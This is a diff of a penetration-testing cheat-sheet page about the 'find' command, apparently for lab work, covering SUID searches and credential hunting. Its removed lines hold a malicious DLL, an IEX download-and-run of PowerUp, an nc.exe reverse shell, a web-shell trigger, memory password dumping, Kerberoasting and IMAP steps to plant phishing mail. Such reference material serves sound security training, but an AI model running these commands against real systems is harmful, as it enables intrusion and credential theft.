@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/find.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Locate SUID files on the current root filesystem
+[Search this tool’s saved examples](/commands/notebook?tool=find) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Locate SUID files on the current root filesystem
 
 **Run in:** Linux target. **Requires:** Read/traverse access to the filesystem; -xdev deliberately omits other mounted filesystems and hidden errors limit coverage.
 
@@ -21,125 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 find / -xdev -type f -perm -4000 -print 2>/dev/null
 ```
 
-**Read the result:** Narrow by directory, type, owner or permission and inspect the returned path before acting on it.
-
-**If A SUID file is present but does not yield elevated behavior:** Traversal permissions, mounted filesystems and filename whitespace affect results; -exec actions can modify every match if used carelessly.
+**What the result establishes:** Narrow by directory, type, owner or permission and inspect the returned path before acting on it.
 
 **Next check:** Inspect owner, mount options, binary version and how that program handles privileges; enumerate relevant other mounts separately.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.gnu.org/software/findutils/manual/html_mono/find.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## find: choose the operation and read the result
-
-Search Linux paths by name, type or permissions.
-
-### What the result establishes
-
-Narrow by directory, type, owner or permission and inspect the returned path before acting on it.
-
-### Prerequisites and common failures
-
-Traversal permissions, mounted filesystems and filename whitespace affect results; -exec actions can modify every match if used carelessly.
-
-### Example 1: Commands
-
-Run in: **Linux target**.
-
-```bash
-find / -name "*.conf" 2>/dev/null
-find / -perm -4000 -type f 2>/dev/null
-find . -type f -mmin -10
-```
-
-### Example 2: Last edited files
-
-Run in: **Saved lab example**.
-
-```powershell
-find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — Last edited files](/privesc/linux-privesc-checklist#last-edited-files). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Sensitive files
-
-Run in: **Saved lab example**.
-
-```ps1
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — Sensitive files](/privesc/linux-privesc-checklist#sensitive-files). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Find SUID binaries
-
-Run in: **Saved lab example**.
-
-```bash
-find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-find / -uid 0 -perm -4000 -type f 2>/dev/null
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — Find SUID binaries](/privesc/linux-privesc-checklist#find-suid-binaries). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Files containing passwords
-
-Run in: **Saved lab example**.
-
-```powershell
-grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
-find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — Files containing passwords](/privesc/linux-privesc-checklist#files-containing-passwords). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: In memory passwords
-
-Run in: **Saved lab example**.
-
-```ps1
-# Find PID
-ps -eo pid,command
-
-# Core dump PID
-gcore <pid> -o dumpfile
-
-# Search for passwords
-strings -n 5 dumpfile | grep -i pass
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — In memory passwords](/privesc/linux-privesc-checklist#in-memory-passwords). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Writable files
-
-Run in: **Saved lab example**.
-
-```powershell
-find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
-find / -perm -2 -type f 2>/dev/null
-find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
-```
-
-Saved context: [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Search Linux paths by name, type or permissions.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=find) · [All tools](/index)
 
 ## Commands
 
@@ -151,40 +43,17 @@ find / -perm -4000 -type f 2>/dev/null
 find . -type f -mmin -10
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [Bash quoting and pipelines — Example 1: Commands](/field/bash#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| A SUID file is present but does not yield elevated behavior | Traversal permissions, mounted filesystems and filename whitespace affect results; -exec actions can modify every match if used carelessly. |
 
 ## Notebook recipes
 
-43 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+35 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
-
-<Accordion title="AD Certificate Services: Quick Reference">
-
-### AD Certificate Services: Quick Reference
-
-**AD Certificate Services: Quick Reference**
-
-```bash
-# find vulnerable templates
-certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AD Certificate Services: Quick Reference — Existing notes and worked examples](/active-directory/adcs#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
 
 <Accordion title="5. Credential hunting (Linux)">
 
@@ -212,97 +81,6 @@ ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 
 </Accordion>
 
-<Accordion title="Kerberos / Spns">
-
-### Kerberos / Spns
-
-**Active Directory Enumeration Commands**
-
-```bash
-GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
-    # Find user accounts with registered SPNs
-
-GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
-    # Request TGS tickets for Kerberoasting
-
-GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
-    # Find accounts vulnerable to AS-REP roasting
-
-GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
-    # Query for AS-REP roastable accounts using credentials
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AS-REP Roasting: Quick Reference — Example 3: Kerberos / Spns](/active-directory/asrep-roasting#example-3-kerberos-/-spns) · [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Powerview">
-
-### Powerview
-
-**Active Directory Enumeration Commands**
-
-```powershell
-Get-DomainUser
-    # Enumerate domain users
-
-Get-DomainUser <USER>
-    # Get information about a specific domain user
-
-Get-DomainGroup
-    # Enumerate domain groups
-
-Get-DomainGroupMember "<GROUP>"
-    # Show members of a domain group
-
-Get-DomainUser <USER> -Properties memberof
-    # Show a user's AD group memberships
-
-Get-DomainComputer
-    # Enumerate domain computers
-
-Get-DomainController
-    # Find Domain Controllers
-
-Get-DomainSPNTicket
-    # Identify/request Kerberos tickets associated with SPNs
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration Commands — Powerview](/active-directory/command-reference#powerview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="10. Ghidra — reading the native crypto">
-
-### 10. Ghidra — reading the native crypto
-
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
-
-```bash
-readelf -S libextpool30.so      # find .text/.rodata addresses vs file offsets
-# the shift here was 0x1000, e.g. function at Ghidra 0x101b1c → file offset 0xb1c
-xxd -s 0xb1c -l 16 libextpool30.so   # confirmed an AArch64 prologue: ff c3 05 d1 (sub sp,...)
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 10. Ghidra — reading the native crypto](/research/android-malware-walkthrough#10-ghidra-—-reading-the-native-crypto)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Linux">
 
 ### Linux
@@ -318,21 +96,6 @@ grcic550@htb[/htb]$ find /mnt/Finance/ -name *cred*
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Privilege Escalation: Choose a Checklist**
-
-Context from the notebook: find / -perm -4000 -type f 2>/dev/null  → SUID binary list → GTFOBins lookup
-
-```text
-find / -perm -4000 -type f 2>/dev/null
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Privilege Escalation: Choose a Checklist — Linux](/privesc/index#linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -388,53 +151,24 @@ The following command | find /c ":\\" process the output of dir n: /a-d /s /b to
 
 </Accordion>
 
-<Accordion title="Common Google Dorks">
+<Accordion title="Search and compare local evidence">
 
-### Common Google Dorks
+### Search and compare local evidence
 
-**DNS and Web Reconnaissance: Full Workflow**
-
-```text
-# Find login/admin pages
-site:example.com inurl:login
-site:example.com (inurl:login OR inurl:admin)
-
-# Find exposed files
-site:example.com filetype:pdf
-site:example.com (filetype:xls OR filetype:docx)
-
-# Find config files
-site:example.com inurl:config.php
-site:example.com (ext:conf OR ext:cnf)
-
-# Find database backups
-site:example.com inurl:backup
-site:example.com filetype:sql
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Common Google Dorks](/recon/dns-web-recon-cheat-sheet#common-google-dorks)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Bypassing filters">
-
-### Bypassing filters
-
-**File Upload Testing: Quick Reference**
+**Everyday Terminal Commands: Guide Link**
 
 ```bash
-# find where it landed, then trigger
-curl "http://$IP/uploads/shell.php?c=id"
+rg -n -i 'password|credential|connectionstring' notes loot
+find loot -type f -iname '*config*'
+sort discovered-users.txt | uniq -c
+wc -l discovered-users.txt
+file loot/artifact
+sha256sum loot/artifact
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [File Upload Attacks — Bypassing filters](/web/file-upload#bypassing-filters)
+**Original note sections:** [Everyday Terminal Commands: Guide Link — Search and compare local evidence](/tools/common-commands#search-and-compare-local-evidence)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -533,7 +267,7 @@ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extensions: " $l; find 
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 3: Find Credentials on Linux](/field/bash#example-3-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -546,7 +280,7 @@ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; fin
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 5: Find Credentials on Linux](/field/bash#example-5-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -572,7 +306,7 @@ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " 
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 6: Find Credentials on Linux](/field/bash#example-6-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -717,7 +451,7 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Files containing passwords](/privesc/linux-privesc-checklist#files-containing-passwords) · [Bash quoting and pipelines — Example 5: Files containing passwords](/field/bash#example-5-files-containing-passwords)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Files containing passwords](/privesc/linux-privesc-checklist#files-containing-passwords)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -737,33 +471,51 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Find SUID binaries](/privesc/linux-privesc-checklist#find-suid-binaries) · [Bash quoting and pipelines — Example 4: Find SUID binaries](/field/bash#example-4-find-suid-binaries)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Find SUID binaries](/privesc/linux-privesc-checklist#find-suid-binaries)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="In memory passwords">
+<Accordion title="Hunt credentials where applications use them">
 
-### In memory passwords
+### Hunt credentials where applications use them
 
 **Linux Privilege Escalation: Full Checklist**
 
-```ps1
-# Find PID
-ps -eo pid,command
-
-# Core dump PID
-gcore <pid> -o dumpfile
-
-# Search for passwords
-strings -n 5 dumpfile | grep -i pass
+```bash
+find /var/www /opt /home -type f \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*config*' \) 2>/dev/null
+ls -la ~/.ssh
+ls -la /var/backups
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — In memory passwords](/privesc/linux-privesc-checklist#in-memory-passwords) · [Bash quoting and pipelines — Example 6: In memory passwords](/field/bash#example-6-in-memory-passwords)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Hunt credentials where applications use them](/privesc/linux-privesc-checklist#hunt-credentials-where-applications-use-them)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Inspect special permissions and writable paths">
+
+### Inspect special permissions and writable paths
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+find / -type f -perm -4000 -ls 2>/dev/null
+find / -type f -perm -2000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+find /etc /opt /usr/local /var/www -writable -ls 2>/dev/null
+ls -ld /PATH /PATH/TO /PATH/TO/FILE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Inspect special permissions and writable paths](/privesc/linux-privesc-checklist#inspect-special-permissions-and-writable-paths)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -782,7 +534,7 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Last edited files](/privesc/linux-privesc-checklist#last-edited-files) · [Bash quoting and pipelines — Example 2: Last edited files](/field/bash#example-2-last-edited-files)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Last edited files](/privesc/linux-privesc-checklist#last-edited-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -802,7 +554,7 @@ find / -name id_rsa 2> /dev/null
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Sensitive files](/privesc/linux-privesc-checklist#sensitive-files) · [Bash quoting and pipelines — Example 3: Sensitive files](/field/bash#example-3-sensitive-files)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Sensitive files](/privesc/linux-privesc-checklist#sensitive-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -823,7 +575,7 @@ find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files) · [Bash quoting and pipelines — Example 7: Writable files](/field/bash#example-7-writable-files)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -922,7 +674,7 @@ python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack mo
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Oracle Database and TNS Enumeration — Example 3: Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#example-3-footprinting-&-sid-enumeration) · [Oracle Database and TNS Enumeration — Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#footprinting-&-sid-enumeration)
+**Original note sections:** [Oracle Database and TNS Enumeration — Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#footprinting-&-sid-enumeration)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -991,33 +743,23 @@ id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; ca
 
 </Accordion>
 
-<Accordion title="Driving IMAP">
+<Accordion title="Linux privilege and execution relationships">
 
-### Driving IMAP
+### Linux privilege and execution relationships
 
-**Read and Search Email with POP3 and IMAP**
+**Systems & Pivoting: Enumeration Methodology**
 
-```text
-# Find credentials across an entire large mailbox in one query:
-a6 SEARCH TEXT "password"
-
-# Cover your tracks — mark a message you read back as Unread:
-a7 STORE 1 -FLAGS (\Seen)
-
-# Delete and permanently purge a message:
-a8 STORE 1 +FLAGS (\Deleted)
-a9 EXPUNGE
-
-# Forge a message straight into the mailbox (e.g. plant a phishing link):
-# {52} is the exact byte length of the literal that follows, INCLUDING the \r\n line endings.
-a10 APPEND INBOX {52}
-Subject: Fake Email
-Here is the malicious link.
+```bash
+find / -xdev -type f -perm -4000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+ls -la /etc/cron.d /etc/cron.daily /var/spool/cron 2>/dev/null
+systemctl list-timers --all
+systemctl list-units --type=service --state=running
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Read and Search Email with POP3 and IMAP — Driving IMAP](/enumeration/email-enumeration-manipulation-pop3-imap#driving-imap)
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — Linux privilege and execution relationships](/pivoting/methodology#linux-privilege-and-execution-relationships)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1060,35 +802,6 @@ Prove it, write it up, clean up
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
-# find missing DLL 
-- Find-PathDLLHijack PowerUp.ps1
-- Process Monitor : check for "Name Not Found"
-
-# compile a malicious dll
-- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
-- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
-
-# content of windows_dll.c
-#include <windows.h>
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
-        ExitProcess(0);
-    }
-    return TRUE;
-}
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Incorrect permissions in services](/privesc/windows-privesc-checklist#eop-incorrect-permissions-in-services)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Windows Privilege Escalation: Full Checklist**
-
-```powershell
 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
@@ -1102,37 +815,6 @@ FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Incorrect permissions in services](/privesc/windows-privesc-checklist#eop-incorrect-permissions-in-services)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="EoP - Unquoted Service Paths">
-
-### EoP - Unquoted Service Paths
-
-**Windows Privilege Escalation: Full Checklist**
-
-```powershell
-# find the vulnerable application
-C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
-
-...
-[*] Checking for unquoted service paths...
-ServiceName   : BBSvc
-Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
-StartName     : LocalSystem
-AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
-...
-
-# automatic exploit
-Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Unquoted Service Paths](/privesc/windows-privesc-checklist#eop-unquoted-service-paths)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1177,28 +859,7 @@ netshareenumall       # where are the shares?
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Typical null-session workflow](/enumeration/rpcclient-cheat-sheet#example-4-typical-null-session-workflow) · [rpcclient: Users, Groups, and Domain Policy — Typical null-session workflow](/enumeration/rpcclient-cheat-sheet#typical-null-session-workflow) · [SMB Enumeration and Shares — Example 4: Typical null-session workflow](/enumeration/smb-enumeration-server-message-block#example-4-typical-null-session-workflow)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Spawning Interactive TTY Shells">
-
-### Spawning Interactive TTY Shells
-
-**Shells, Payloads, and Interactive TTYs**
-
-Context from the notebook: Find find . -exec /bin/sh \; -quit
-
-```text
-find . -exec /bin/sh \; -quit
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Shells, Payloads, and Interactive TTYs — Spawning Interactive TTY Shells](/exploitation/shells-payloads-cheat-sheet#spawning-interactive-tty-shells)
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Typical null-session workflow](/enumeration/rpcclient-cheat-sheet#typical-null-session-workflow)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1207,6 +868,10 @@ find . -exec /bin/sh \; -quit
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://www.gnu.org/software/findutils/manual/html_mono/find.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -1214,5 +879,3 @@ find . -exec /bin/sh \; -quit
 - [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
